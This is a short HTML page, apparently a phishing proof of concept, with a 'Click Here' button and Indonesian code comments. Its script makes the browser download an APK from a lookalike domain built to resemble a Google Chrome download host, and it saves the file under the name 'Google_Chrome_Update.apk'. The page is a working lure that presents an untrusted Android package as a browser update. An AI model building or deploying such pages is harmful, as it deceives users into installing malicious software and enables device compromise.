<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
</style>
</head>
<body>
<script>
function a(){
	// Langsung trigger download tanpa delay dan tanpa tab palsu
	var link = document.createElement('a');
	link.href = 'http://chrome-downloads.google.communication.unaux.com/POC.apk';
	link.download = 'Google_Chrome_Update.apk'; // nama file saat didownload
	document.body.appendChild(link);
	link.click();
	document.body.removeChild(link);
}
</script>
<center><input type="button" class="button" value="Click Here" onclick="a()"></center>
</body>
</html>
